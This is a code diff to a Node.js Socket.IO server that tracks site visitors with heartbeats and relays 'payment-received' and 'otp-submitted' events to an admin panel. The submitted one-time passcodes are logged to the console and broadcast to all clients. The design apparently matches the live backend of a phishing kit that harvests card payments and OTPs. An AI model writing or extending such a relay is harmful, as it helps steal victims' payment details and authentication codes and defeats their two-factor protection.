@@ -47,12 +47,22 @@ io.on('connection', (socket) => {
     socket.broadcast.emit('payment-received', data);
   });
 
-  // Handle visitor tracking
+  // Handle visitor tracking with heartbeat mechanism
   socket.on('visitor-joined', (data) => {
     console.log('Visitor joined:', data);
     
+    // Store visitor data with socket ID for tracking
+    socket.visitorData = data;
+    
     // Emit to admin panel (broadcast to all connected clients)
     socket.broadcast.emit('visitor-joined', data);
+  });
+
+  socket.on('visitor-heartbeat', (data) => {
+    // Update visitor activity timestamp
+    if (socket.visitorData) {
+      socket.visitorData.lastActivity = new Date().toISOString();
+    }
   });
 
   socket.on('visitor-left', (data) => {
@@ -81,11 +91,16 @@ io.on('connection', (socket) => {
   // Handle OTP submission
   socket.on('otp-submitted', (data) => {
     console.log('OTP submitted:', data);
-    socket.broadcast.emit('otp-received', data);
+    socket.broadcast.emit('otp-submitted', data);
   });
 
   socket.on('disconnect', () => {
     console.log('User disconnected:', socket.id);
+    
+    // If visitor was tracked, emit visitor left event
+    if (socket.visitorData) {
+      socket.broadcast.emit('visitor-left', socket.visitorData);
+    }
   });
 });
 
